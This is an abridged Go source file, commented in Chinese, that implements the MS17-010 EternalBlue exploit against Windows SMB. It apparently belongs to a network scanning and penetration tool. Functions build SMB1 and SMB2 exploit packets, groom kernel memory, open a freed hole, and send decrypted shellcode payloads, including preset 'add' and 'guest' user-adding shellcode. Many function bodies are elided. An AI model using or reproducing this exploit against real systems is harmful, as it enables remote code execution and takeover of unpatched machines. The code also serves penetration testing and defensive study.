...
func SystemVulnProcessor(info *Common.HostInfo) {
	...
	case "add":
		...
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 解密 add shellcode 失败 : %v", info.Host, err))
			return
		}
	...
	case "guest":
		...
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 解密 guest shellcode 失败 : %v", info.Host, err))
			return
		}

	default:
		// 从文件读取或直接使用提供的 shellcode
		if strings.Contains(Common.Shellcode, "file:") {
			read, err := ioutil.ReadFile(Common.Shellcode[5:])
			if err != nil {
				Common.LogError(fmt.Sprintf("MS17010 读取 Shellcode 文件 %v 失败 : %v", Common.Shellcode, err))
				return
			}
	...
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010 Shellcode 解码失败 : %v", info.Host, err))
		return
	}
	...
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010 漏洞利用失败 : %v", info.Host, err))
		return
	}
...
// eternalBlue 执行 EternalBlue 漏洞利用
func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	// 检查 shellcode 大小
	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16 长度
	scLen := len(sc)
	if scLen > maxscSize {
		return fmt.Errorf("Shellcode 大小超出限制 : %d > %d ( 超出 %d 字节 )",
...
func exploit(address string, grooms int, payload []byte) error {
	...
	// 发送 payload
	Common.LogSuccess(" 开始发送 Payload")
	body := makeSMB2Body(payload)

	// 分段发送 payload
	for _, conn := range groomConns {
		if _, err = conn.Write(body[:2920]); err != nil {
			return fmt.Errorf(" 发送 Payload 第一段失败 : %v", err)
		}
	}

	for _, conn := range groomConns {
		if _, err = conn.Write(body[2920:4073]); err != nil {
			return fmt.Errorf(" 发送 Payload 第二段失败 : %v", err)
		}
	}

	Common.LogSuccess("Payload 发送完成 ")
	return nil
}

// makeKernelUserPayload 构建内核用户空间 Payload
...
// smb1AnonymousConnectIPC 创建 SMB1 匿名 IPC 连接
func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
	...
	if err = smbClientNegotiate(conn); err != nil {
		return nil, nil, fmt.Errorf("SMB 协议协商失败 : %v", err)
	}
	...
	if err != nil {
		return nil, nil, fmt.Errorf(" 连接 IPC 共享失败 : %v", err)
	}
...
// smbHeader SMB 协议头部结构
type smbHeader struct {
	ServerComponent [4]byte // 服务器组件标识
	SMBCommand      uint8   // SMB 命令码
	ErrorClass      uint8   // 错误类别
	Reserved        byte    // 保留字节
	ErrorCode       uint16  // 错误代码
	Flags           uint8   // 标志位
	Flags2          uint16  // 扩展标志位
	ProcessIDHigh   uint16  // 进程 ID 高位
	Signature       [8]byte // 签名
	Reserved2       [2]byte // 保留字节
	TreeID          uint16  // 树连接 ID
	ProcessID       uint16  // 进程 ID
	UserID          uint16  // 用户 ID
	MultiplexID     uint16  // 多路复用 ID
}

// smb1GetResponse 获取 SMB1 协议响应数据
func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
	// 读取 NetBIOS 会话服务头
	buf := make([]byte, 4)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf(" 读取 NetBIOS 会话服务头失败 : %v", err)
	}
	...
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf(" 读取 SMB 消息体失败 : %v", err)
	}
	...
	if err := binary.Read(reader, binary.LittleEndian, &header); err != nil {
		return nil, nil, fmt.Errorf(" 解析 SMB 头部失败 : %v", err)
	}

	return buf, &header, nil
}

// smbClientNegotiate 执行 SMB 协议协商
func smbClientNegotiate(conn net.Conn) error {
	buf := bytes.Buffer{}

	// 构造 NetBIOS 会话服务头
	if err := writeNetBIOSHeader(&buf); err != nil {
		return fmt.Errorf(" 构造 NetBIOS 头失败 : %v", err)
	}

	// 构造 SMB 协议头
	if err := writeSMBHeader(&buf); err != nil {
		return fmt.Errorf(" 构造 SMB 头失败 : %v", err)
	}
...
// writeNetBIOSHeader 写入 NetBIOS 会话服务头
...
// writeNetBIOSLoginHeader 写入 NetBIOS 会话服务头
...
// writeSMBLoginHeader 写入 SMB 协议头
...
func writeOSInfo(buf *bytes.Buffer) {
	...
	// 原生 LAN Manager: Windows 2000 5.0
...
// getOSName 从 SMB 响应中提取操作系统名称
// 跳过 SMB 头部、字数统计、 AndX 命令、保留字段、 AndX 偏移量、操作标志、字节数以及魔数 0x41(A)
func getOSName(raw []byte) (string, error) {
	...
	// 将 UTF-16 编码转换为 ASCII 编码
	bufLen := osBuf.Len()
	osName := make([]byte, 0, bufLen/2)
	rawBytes := osBuf.Bytes()

	// 每隔两个字节取一个字节 ( 去除 UTF-16 的高字节 )
...
// writeNetBIOSTreeHeader 写入 NetBIOS 会话服务头
...
func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
	...
	if err != nil {
		return fmt.Errorf(" 发送 NT Trans 请求失败 : %v", err)
	}
...
func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
	...
	if err := writeNTTransRequest(&buf); err != nil {
		return nil, fmt.Errorf(" 构造 NT Trans 请求失败 : %v", err)
	}

	// 发送数据包
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, fmt.Errorf(" 发送 NT Trans 请求失败 : %v", err)
	}

	// 获取响应
	_, header, err := smb1GetResponse(conn)
	if err != nil {
		return nil, fmt.Errorf(" 获取 NT Trans 响应失败 : %v", err)
	}

	return header, nil
}

// writeNetBIOSNTTransHeader 写入 NetBIOS 会话服务头
...
// writeSMBNTTransHeader 写入 SMB 协议头
...
// writeNTTransRequest 写入 NT Trans 请求
...
// makeSMB1Trans2ExploitPacket 创建 SMB1 Trans2 利用数据包
...
// writeNetBIOSTrans2Header 写入 NetBIOS 会话服务头
...
// writeSMBTrans2Header 写入 SMB 协议头
...
// writeTrans2RequestHeader 写入 Trans2 请求头
...
// writeExploitPayload 写入 exploit 类型负载
...
// writeExploitTrailingData 写入 exploit 类型的尾部数据
...
// makeSMB1EchoPacket 创建 SMB1 Echo 数据包
...
// writeNetBIOSEchoHeader 写入 NetBIOS 会话服务头
...
func smb1FreeHole(address string, start bool) (net.Conn, error) {
	...
	// SMB 协议协商
	if err = smbClientNegotiate(conn); err != nil {
		return nil, fmt.Errorf("SMB 协议协商失败 : %v", err)
	}
...
// makeSMB1FreeHoleSessionPacket 创建 SMB1 内存释放会话数据包
...
// writeNetBIOSFreeHoleHeader 写入 NetBIOS 会话服务头
...
func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
	...
	for i := 0; i < grooms; i++ {
		...
		if _, err = conn.Write(header); err != nil {
			return nil, fmt.Errorf(" 发送 SMB2 头失败 : %v", err)
		}
...
// loader 用于在内核模式下运行用户模式 shellcode 的加载器
// 参考自 Metasploit-Framework:
